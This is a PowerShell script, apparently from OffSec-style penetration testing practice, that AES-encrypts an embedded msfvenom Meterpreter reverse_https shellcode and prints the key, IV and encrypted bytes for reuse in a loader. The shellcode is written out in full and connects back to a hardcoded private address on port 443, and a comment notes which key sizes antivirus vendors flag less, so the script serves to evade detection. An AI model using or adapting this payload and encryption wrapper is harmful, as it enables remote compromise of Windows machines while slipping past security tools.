function Get-RandomBytes($Size) {
    $rb = [Byte[]]::new($Size)
    $rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
    $rng.GetBytes($rb)
    $rng.Dispose()
    return $rb
}

function Format-ByteArrayToHex($Bytes, $VarName) {
    $hex = ''
    for ($count = 0; $count -lt $Bytes.Count; $count++) 
    {
        [Byte]$b = $Bytes[$count]
        if (($count + 1) -eq $Bytes.Length) 
        {
            # If this is the last byte don't append a comma
            $hex += "0x{0:x2}" -f $b
        } 
        Else 
        {
            $hex += "0x{0:x2}," -f $b
        }
        
        # Let's keep the output clean so only 15 bytes are in a row
        if (($count + 1) % 15 -eq 0)
        {
            $hex += "{0}" -f "`n"
        }
    }
    # Output the hex into a format we can just copy/paste for later use
    $formatted = '[Byte[]]{0} = {1}{2}' -f $('$'+$VarName), "`n", $hex  
    return $formatted
}

function Encrypt-Bytes($Bytes, $Key, $IV) {
    $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider

    # 128-bit | 192-bit | 256-bit
    # I found that some vendors flag payloads more that use 256-bit vs 128-bit. Something to keep in mind.
    $aes.KeySize = 256
    
    # Does not change between 128/192/256-bit key lengths
    $aes.BlockSize = 128
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aes.key = $Key
    $aes.IV = $IV

    $encryptor = $aes.CreateEncryptor($aes.Key, $aes.IV)
    $encrypted = $encryptor.TransformFinalBlock($Bytes, 0, $Bytes.Length)
    
    # If you keep powershell open this will stay in memory, dispose those secrets!
    $aes.Dispose() 
    return $encrypted
}

function Decrypt-Bytes($Bytes, $Key, $IV) {
    $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
    $aes.KeySize = 256
    $aes.BlockSize = 128

    # Keep this in mind when you view your decrypted content as the size will likely be different
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aes.key = $Key
    $aes.IV = $IV

    $decryptor = $aes.CreateDecryptor($aes.Key, $aes.IV)
    $decrypted = $decryptor.TransformFinalBlock($Bytes, 0, $Bytes.Length) 

    # If you keep powershell open this will stay in memory, dispose those secrets!
    $aes.Dispose()
    return $decrypted
}

# 16 Bytes > AES-128 | 24 Bytes > AES-192 | 32 Bytes > AES-256
[Byte[]]$Key = Get-RandomBytes -Size 32

# This does not change between different key lengths
[Byte[]]$IV = Get-RandomBytes -Size 16

# msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.X.X LPORT=443 EXITFUNC=thread -f ps1
[Byte[]] $payload = 0xfc,0xe8,0x8f,0x0,0x0,0x0,0x60,0x31,0xd2,0x64,0x8b,0x52,0x30,0x89,0xe5,0x8b,0x52,0xc,0x8b,0x52,0x14,0x31,0xff,0xf,0xb7,0x4a,0x26,0x8b,0x72,0x28,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0xc1,0xcf,0xd,0x1,0xc7,0x49,0x75,0xef,0x52,0x8b,0x52,0x10,0x57,0x8b,0x42,0x3c,0x1,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4c,0x1,0xd0,0x50,0x8b,0x58,0x20,0x1,0xd3,0x8b,0x48,0x18,0x85,0xc9,0x74,0x3c,0x49,0x31,0xff,0x8b,0x34,0x8b,0x1,0xd6,0x31,0xc0,0xac,0xc1,0xcf,0xd,0x1,0xc7,0x38,0xe0,0x75,0xf4,0x3,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe0,0x58,0x8b,0x58,0x24,0x1,0xd3,0x66,0x8b,0xc,0x4b,0x8b,0x58,0x1c,0x1,0xd3,0x8b,0x4,0x8b,0x1,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xe9,0x80,0xff,0xff,0xff,0x5d,0x68,0x6e,0x65,0x74,0x0,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,0x4c,0x77,0x26,0x7,0xff,0xd5,0x31,0xdb,0x53,0x53,0x53,0x53,0x53,0xe8,0x3e,0x0,0x0,0x0,0x4d,0x6f,0x7a,0x69,0x6c,0x6c,0x61,0x2f,0x35,0x2e,0x30,0x20,0x28,0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x20,0x4e,0x54,0x20,0x36,0x2e,0x31,0x3b,0x20,0x54,0x72,0x69,0x64,0x65,0x6e,0x74,0x2f,0x37,0x2e,0x30,0x3b,0x20,0x72,0x76,0x3a,0x31,0x31,0x2e,0x30,0x29,0x20,0x6c,0x69,0x6b,0x65,0x20,0x47,0x65,0x63,0x6b,0x6f,0x0,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0x53,0x53,0x6a,0x3,0x53,0x53,0x68,0xbb,0x1,0x0,0x0,0xe8,0xf,0x1,0x0,0x0,0x2f,0x65,0x4e,0x69,0x6c,0x71,0x6a,0x71,0x64,0x75,0x78,0x59,0x4d,0x67,0x41,0x32,0x42,0x62,0x51,0x57,0x49,0x50,0x77,0x54,0x35,0x4b,0x71,0x55,0x56,0x53,0x6f,0x33,0x76,0x35,0x4f,0x36,0x5a,0x79,0x67,0x6e,0x38,0x59,0x36,0x50,0x42,0x4f,0x30,0x33,0x32,0x5a,0x36,0x37,0x75,0x53,0x6c,0x4a,0x51,0x35,0x57,0x44,0x63,0x54,0x6c,0x37,0x75,0x34,0x39,0x4e,0x71,0x4b,0x5f,0x65,0x49,0x52,0x62,0x69,0x4c,0x6d,0x63,0x4f,0x4e,0x45,0x42,0x70,0x77,0x4f,0x4b,0x31,0x6a,0x4f,0x59,0x35,0x49,0x76,0x35,0x77,0x50,0x36,0x50,0x5f,0x4b,0x4a,0x73,0x7a,0x6d,0x71,0x47,0x6c,0x58,0x42,0x4b,0x74,0x70,0x79,0x36,0x75,0x65,0x52,0x4f,0x6a,0x54,0x32,0x72,0x44,0x61,0x50,0x55,0x0,0x50,0x68,0x57,0x89,0x9f,0xc6,0xff,0xd5,0x89,0xc6,0x53,0x68,0x0,0x32,0xe8,0x84,0x53,0x53,0x53,0x57,0x53,0x56,0x68,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x96,0x6a,0xa,0x5f,0x68,0x80,0x33,0x0,0x0,0x89,0xe0,0x6a,0x4,0x50,0x6a,0x1f,0x56,0x68,0x75,0x46,0x9e,0x86,0xff,0xd5,0x53,0x53,0x53,0x53,0x56,0x68,0x2d,0x6,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x14,0x68,0x88,0x13,0x0,0x0,0x68,0x44,0xf0,0x35,0xe0,0xff,0xd5,0x4f,0x75,0xcd,0xe8,0x4a,0x0,0x0,0x0,0x6a,0x40,0x68,0x0,0x10,0x0,0x0,0x68,0x0,0x0,0x40,0x0,0x53,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x53,0x89,0xe7,0x57,0x68,0x0,0x20,0x0,0x0,0x53,0x56,0x68,0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0xcf,0x8b,0x7,0x1,0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3,0x5f,0xe8,0x6b,0xff,0xff,0xff,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x34,0x39,0x2e,0x37,0x34,0x0,0xbb,0xe0,0x1d,0x2a,0xa,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x6,0x7c,0xa,0x80,0xfb,0xe0,0x75,0x5,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x0,0x53,0xff,0xd5

# Encrypt
$encBytes = Encrypt-Bytes -Bytes $payload -Key $Key -IV $IV

# Decrypt
$decBytes = Decrypt-Bytes -Bytes $encBytes -Key $Key -IV $IV

# Format our byte array into a variable format we can use later
$keyStr = Format-ByteArrayToHex -Bytes $key -VarName 'OffSec'
$ivStr = Format-ByteArrayToHex -Bytes $iv -VarName 'Says'
$rawStr = Format-ByteArrayToHex -Bytes $payload -VarName 'Try'
$encStr = Format-ByteArrayToHex -Bytes $encBytes -VarName 'Har'
$decStr = Format-ByteArrayToHex -Bytes $decBytes -VarName 'der'

# Print results
Write-Host "[*] Key:"
Write-Host $keyStr

Write-Host "`n[*] IV:"
Write-Host $ivStr

Write-Host "`n[*] Raw Bytes:"
Write-Host $rawStr

Write-Host "`n[*] Encrypted Bytes"
Write-Host $encStr

Write-Host "`n[*] Decrypted Bytes"
Write-Host $decStr
